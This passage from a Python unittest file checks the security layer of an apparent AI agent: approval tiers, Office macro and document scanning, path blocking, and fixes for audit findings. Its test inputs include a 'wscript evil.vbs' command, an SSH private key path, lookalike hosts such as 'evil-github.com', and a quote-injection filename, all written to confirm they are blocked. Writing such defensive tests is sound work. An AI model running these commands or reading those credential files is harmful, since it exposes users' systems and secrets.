                         ApprovalTier.TIER_3)
        self.assertEqual(OperationClassifier.classify('WRITE', 'file.txt'),
                         ApprovalTier.TIER_2)
        self.assertEqual(OperationClassifier.classify('POLICY_MODIFY'),
                         ApprovalTier.TIER_4)


# =============================================================================
# 17. TIER INTEGRATION: GraphAPIRegistry → FIDO2 tier mapping
# =============================================================================

class TestGraphAPIFido2Mapping(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.registry = GraphAPIRegistry(self.logger, config={
            'scopes': ['Files.Read', 'Files.ReadWrite'],
        })

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_standard_maps_to_tier2(self):
        ok, tier, _ = self.registry.validate_request('GET', '/me/drive/root/children')
        self.assertTrue(ok)
        self.assertEqual(tier, 'TIER_2')

    def test_elevated_maps_to_tier2(self):
        ok, tier, _ = self.registry.validate_request('GET', '/me/drive/items/abc/content')
        self.assertTrue(ok)
        self.assertEqual(tier, 'TIER_2')

    def test_critical_maps_to_tier3(self):
        ok, tier, _ = self.registry.validate_request('PUT', '/me/drive/items/abc/content')
        self.assertTrue(ok)
        self.assertEqual(tier, 'TIER_3')

    def test_file_create_maps_to_tier3(self):
        ok, tier, _ = self.registry.validate_request('POST', '/me/drive/root/children')
        self.assertTrue(ok)
        self.assertEqual(tier, 'TIER_3')

    def test_mapping_dict_exists(self):
        self.assertIn('standard', GraphAPIRegistry.GRAPH_TO_FIDO2_TIER)
        self.assertIn('elevated', GraphAPIRegistry.GRAPH_TO_FIDO2_TIER)
        self.assertIn('critical', GraphAPIRegistry.GRAPH_TO_FIDO2_TIER)


# =============================================================================
# 18. PIPELINE INTEGRATION: SecureExecutor has Office components
# =============================================================================

class TestSecureExecutorOfficeWiring(unittest.TestCase):
    """Verify SecureExecutor receives and uses Office security components."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.alerts = AlertManager(self.cfg, self.logger)
        self.pv = PathValidator(self.cfg, self.logger)
        self.macro_blocker = MacroBlocker(self.logger)
        self.scanner = DocumentContentScanner(self.logger)
        self.sanitizer = MetadataSanitizer(self.logger)
        self.cv = CommandValidator(self.cfg, self.logger, macro_blocker=self.macro_blocker)
        self.executor = SecureExecutor(
            self.cfg, self.logger, self.alerts, self.pv, self.cv,
            doc_scanner=self.scanner,
            macro_blocker=self.macro_blocker,
            metadata_sanitizer=self.sanitizer,
        )

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_executor_has_doc_scanner(self):
        self.assertIsNotNone(self.executor.doc_scanner)

    def test_executor_has_macro_blocker(self):
        self.assertIsNotNone(self.executor.macro_blocker)

    def test_executor_has_metadata_sanitizer(self):
        self.assertIsNotNone(self.executor.metadata_sanitizer)

    def test_command_validator_has_macro_blocker(self):
        self.assertIsNotNone(self.cv.macro_blocker)

    def test_macro_blocked_in_command_validator(self):
        """CommandValidator should block wscript commands via MacroBlocker."""
        ok, reason = self.cv.validate("wscript evil.vbs")
        # May be blocked by macro blocker OR by whitelist (wscript not whitelisted)
        self.assertFalse(ok)

    def test_executor_without_office_components_works(self):
        """SecureExecutor should still work when Office components are None."""
        bare = SecureExecutor(
            self.cfg, self.logger, self.alerts, self.pv,
            CommandValidator(self.cfg, self.logger))
        self.assertIsNone(bare.doc_scanner)
        self.assertIsNone(bare.macro_blocker)


# =============================================================================
# 19. PATH VALIDATOR: Office paths enforced at system level
# =============================================================================

class TestPathValidatorOfficeBlocking(unittest.TestCase):
    """Verify PathValidator enforces Office blocked paths (merged into main list)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)
        self.pv = PathValidator(self.cfg, self.logger)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_validator_loads_office_patterns(self):
        """PathValidator blocked_patterns should include Office templates."""
        pattern_strs = [p.pattern for p in self.pv.blocked_patterns]
        combined = '\n'.join(pattern_strs)
        self.assertIn('templates', combined.lower())
        self.assertIn('.pst', combined.lower())

    def test_ssh_still_blocked(self):
        """Original blocked paths must not be broken by merge."""
        is_safe, _, reason = self.pv.validate('/home/user/.ssh/id_rsa')
        self.assertFalse(is_safe)


# =============================================================================
# SECURITY REGRESSION TESTS (audit findings F-001 through F-008)
# =============================================================================

class TestAuditRegressions(unittest.TestCase):
    """Tests that verify audit findings remain fixed."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.cfg = _make_config(self.tmp)
        self.logger = SecurityLogger(self.cfg)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    # F-002: exec() injection must not exist
    def test_f002_no_exec_in_metadata_sanitizer(self):
        """F-002: MetadataSanitizer must not use dynamic code evaluation."""
        # Verify the old vulnerable API is gone
        ms = MetadataSanitizer(self.logger)
        self.assertFalse(hasattr(ms, 'get_sanitization_script'),
                         "Old script-generation method still exists!")
        self.assertFalse(hasattr(ms, '_docx_sanitize_script'),
                         "Old script-generation method still exists!")
        # Verify the new safe API exists
        self.assertTrue(hasattr(ms, 'sanitize_file'))
        self.assertTrue(hasattr(ms, '_sanitize_docx'))
        self.assertTrue(hasattr(ms, '_sanitize_xlsx'))
        self.assertTrue(hasattr(ms, '_sanitize_pptx'))

    def test_f002_single_quote_path_safe(self):
        """F-002: A filename with a single quote must not cause code injection."""
        ms = MetadataSanitizer(self.logger)
        # This would have caused exec() injection in the old code
        # The new code should handle it safely (ImportError expected since
        # python-docx may not be installed, but NO code injection)
        try:
            ms.sanitize_file("C:\\test\\it's_my_doc.docx", ".docx")
        except ImportError:
            pass  # Expected — python-docx not installed
        except Exception:
            pass  # Any non-injection exception is acceptable

    # F-003: Network allowlist must use exact/suffix matching
    def test_f003_allowlist_rejects_substring(self):
        """F-003: evil-github.com must NOT match 'github.com' allowlist entry."""
        from aiohai.core.network.interceptor import NetworkInterceptor; from aiohai.core.audit.alerts import AlertManager
        alerts = AlertManager(self.cfg, self.logger)
        ni = NetworkInterceptor(self.cfg, self.logger, alerts)
        allowed, _ = ni._check_connection("evil-github.com", 443)
        self.assertFalse(allowed, "Substring match bypass still exists!")

    def test_f003_allowlist_accepts_subdomain(self):
        """F-003: api.github.com SHOULD match 'github.com' allowlist entry."""
        from aiohai.core.network.interceptor import NetworkInterceptor; from aiohai.core.audit.alerts import AlertManager
        alerts = AlertManager(self.cfg, self.logger)
        ni = NetworkInterceptor(self.cfg, self.logger, alerts)
        allowed, _ = ni._check_connection("api.github.com", 443)
        self.assertTrue(allowed, "Subdomain matching broken!")

    def test_f003_allowlist_accepts_exact(self):
        """F-003: github.com SHOULD match 'github.com' allowlist entry."""
        from aiohai.core.network.interceptor import NetworkInterceptor; from aiohai.core.audit.alerts import AlertManager
        alerts = AlertManager(self.cfg, self.logger)
        ni = NetworkInterceptor(self.cfg, self.logger, alerts)
        allowed, _ = ni._check_connection("github.com", 443)
        self.assertTrue(allowed, "Exact matching broken!")

    def test_f003_doh_rejects_substring(self):
        """F-003: notdns.google.evil.com must NOT match DoH server 'dns.google'."""
        from aiohai.core.network.interceptor import NetworkInterceptor; from aiohai.core.audit.alerts import AlertManager
        alerts = AlertManager(self.cfg, self.logger)
        ni = NetworkInterceptor(self.cfg, self.logger, alerts)
        self.assertFalse(ni._is_doh_server("notdns.google.evil.com"))

    # F-007/F-008: Dangerous executables removed from whitelist
    def test_f007_explorer_removed(self):
        """F-007: explorer.exe must not be in the whitelist."""
        from aiohai.core.constants import WHITELISTED_EXECUTABLES
        self.assertNotIn('explorer.exe', WHITELISTED_EXECUTABLES)

    def test_f008_powershell_removed(self):
        """F-008: powershell.exe and pwsh.exe must not be in the whitelist."""
        from aiohai.core.constants import WHITELISTED_EXECUTABLES
        self.assertNotIn('powershell.exe', WHITELISTED_EXECUTABLES)
        self.assertNotIn('pwsh.exe', WHITELISTED_EXECUTABLES)

    # Dead code removal verification
    def test_dead_code_family_removed(self):
        """FamilyAccessControl and FamilyMember must not exist in current codebase."""
        # The old monolithic security.security_components module no longer exists.
        # Verify these classes aren't in the new layered architecture either.
        import aiohai.core.types as types
        self.assertFalse(hasattr(types, 'FamilyAccessControl'))
        self.assertFalse(hasattr(types, 'FamilyMember'))

    def test_dead_code_docker_compose_removed(self):
        """SecureDockerComposeGenerator must not exist in current codebase."""
        import aiohai.core.types as types
        self.assertFalse(hasattr(types, 'SecureDockerComposeGenerator'))


# =============================================================================
# Run
# =============================================================================

if __name__ == "__main__":
    unittest.main(verbosity=2)
